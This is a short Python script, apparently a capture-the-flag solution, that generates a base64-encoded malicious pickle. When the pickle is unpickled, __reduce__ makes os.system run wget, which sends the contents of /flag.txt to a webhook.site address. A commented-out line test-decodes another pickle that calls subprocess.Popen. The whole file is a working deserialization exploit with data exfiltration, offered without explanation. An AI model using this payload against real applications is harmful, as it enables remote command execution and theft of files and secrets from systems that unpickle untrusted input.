import base64
import pickle
 
class Exploit(object):
    def __reduce__(self):
        import os
        return (os.system,("wget https://webhook.site/1cdf1a4b-9e70-4173-8b43-ed1b32ac549a?a=`cat /flag.txt`",))

print(base64.b64encode(pickle.dumps(Exploit())))

# user = pickle.loads(base64.urlsafe_b64decode("gASVOwAAAAAAAACMCnN1YnByb2Nlc3OUjAVQb3BlbpSTlIwEZWNob5SME3sidXNlcm5hbWUiOiAiVHJpIn2UhpSFlFKULg=="))
# print(user)